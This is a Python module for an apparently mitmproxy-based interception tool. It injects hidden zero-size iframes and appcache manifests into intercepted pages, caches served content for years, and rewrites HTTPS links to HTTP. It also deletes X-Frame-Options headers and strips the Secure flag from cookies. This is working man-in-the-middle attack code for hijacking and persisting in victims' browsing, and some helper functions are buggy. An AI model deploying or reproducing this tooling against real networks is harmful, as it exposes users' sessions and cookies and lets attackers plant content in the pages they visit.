
import json, re, os

try:
	from mitmproxy.models import HTTPResponse
except ImportError:
	from mitmproxy.http import HTTPResponse

#from pprint import pprint

class Config:
	def __init__(self):
		self.initialized = False
		self.config = {}

		# Content type is handled separately
		self.defaultHeaders = [
			("Cache-Control", "public, max-age=31536000"),
			("Expires", "Mon Dec  31 23:59:59 CET 2030")
		]

		self.endings = {
			"js":"text/javascript",
			"html":"text/html"
		}

	def has_initialized(self):
		return self.initialized
	
	def init(self, fname):
		with open(fname, "r") as f:
			data = f.read()
			self.config = json.loads(data)
		self.normalize()

	def get_content_type(self, ending):
		return self.endings.get(ending, None)

	def normalize_one(self, c):
		# Get content type if it has been set
		Type = c.get("content-type", None)

		if c.get("data", "").startswith("file://"):

			# Try and set content type
			if Type == None:	Type = self.get_content_type(c.get("data").split(".")[-1])

			File = c["data"][7:]
			if File.startswith("/") == False:
				File = os.getcwd() + "/" + File
			with open(File, "r") as f:
				c["data"] = f.read()
		if c.get("request", None) == None:
			c["request"] = False

		# If headers exist we must convert them to tuples
		h = c.get("headers", None)
		if h == None:
			c["headers"] = []
			for i in self.defaultHeaders:
				c["headers"].append(i)
		else:
			c["headers"] = []
			for hh in h:
				c["headers"].append( (str(hh.keys()[0]), str(hh[hh.keys()[0]])))

			# If a specific header doesn't exist in the json, we add the default
			for i in self.defaultHeaders:
				exist = False
				for j in h:
					if i[0] in j:
						exist = True
						break
				if exist == False:
					c["headers"].append( i )

		if Type == None:	c["content-type"] = self.endings.get("html")
		else:				c["content-type"] = Type


		c["headers"].append( ("Content-Type", c["content-type"]) )

		return c
	
	def normalize(self):
		newc = {}
		newc["inject"]=[]
		for inject in self.config.get("inject", []):
			if "inject" not in newc:	newc["inject"]=[]
			newc["inject"].append(inject)
		for serve in self.config.get("serve", []):
			if "serve" not in newc:	newc["serve"] = []
			newc["serve"].append(self.normalize_one(serve))
		for iframe in self.config.get("iframes", []):
			ins = {
				"domain":iframe["domain"],
				"path":"^/$",
				"data":"<iframe src='http://" + iframe["url"] + "/' frameborder=0, height=0, width=0></iframe>",
				"content-type":"text/html",
				"placement":{"tag":"body","action":"insert", "where":"first"}
			}
			newc["inject"].append( self.normalize_one(ins) )

		for appcache in self.config.get("appcache", []):
			data = "CACHE MANIFEST\n\nCACHE:\n"
			for f in appcache.get("files", []):
				data += f + "\n"
			ins = {
				"domain":appcache["domain"],
				"path":appcache["path"],
				"data":appcache["rpath"],
				"placement":{"tag":"html","action":"attribute","where":"manifest"}
			}
			if "serve" not in newc:	newc["serve"] = []
			serve = {
				"domain":appcache["domain"],
				"path":appcache["rpath"],
				"data":data,
				"content-type":"text/cache-manifest"
			}

			# Might need to normalize data
			newc["serve"].append( self.normalize_one(serve) )

			newc["inject"].append( ins )

		for c in newc.get("inject", []):
			if c.get("data", "").startswith("file://"):
				File = c["data"][7:]
				if File.startswith("/") == False:
					File = os.getcwd() + "/" + File
				with open(File, "r") as f:
					c["data"] = f.read()
			if c.get("request", None) == None:
				c["request"] = False
		self.config = newc


	def foundMatch(self, host, path, key, request=False):
		ret = []
		for c in self.config.get(key, []):
			if re.match(c.get("domain", ".*"), host) and re.match(c.get("path", ".*"), path) and c.get("request", False) == request:
				# When we match all domains, we don't want to have self-references
				if c.get("domain", ".*") == ".*" and c.get("data", "").find(host) != -1:
					continue
				else:
					ret.append(c)
		return ret



def stripHttpsLinks(content):
	return content.decode().replace("https://", "http://")


def dict2headers(d):
	h = list(d.items())
	headers = []
	for i in h:
		headers.append( ( i[0].encode(), i[1].encode()) )
	return headers
def list2headers(h):
	headers = []
	for i in h:
		headers.append( ( i[0].encode(), i[1].encode()) )
	return headers


def requests2mitmproxy(resp):
	# We first remove some troublesome headers

	# Content is automatically decoded
	if "Content-Encoding" in resp.headers: del resp.headers["Content-Encoding"]

	# Remove clickjacking protections
	if "X-Frame-Options" in resp.headers: del resp.headers["X-Frame-Options"]

	# Ensure that cookies can be sent over HTTP
	if "Set-Cookie" in resp.headers:
		resp.headers["Set-Cookie"] = resp.headers["Set-Cookie"].replace(" Secure;", " ")
		resp.headers["Set-Cookie"] = resp.headers["Set-Cookie"].replace(" Secure", " ")

	h = list(resp.headers.items())
	headers = []
	for i in h:
		headers.append( ( i[0].encode(), i[1].encode()) )

	r = HTTPResponse.make(
		200,
		stripHttpsLinks(resp.content),
		headers
	)
	return r



def validIPv4(ipv4):
	rets = []
	parts = ipv4.split(".")
	if len(parts) != 4:
		return False
	for p in parts:
		n = int(p)
		if n < 0 or n > 255:	return false
		rets.append(n)
	return ".".join(rets)


bcpConfig = Config()
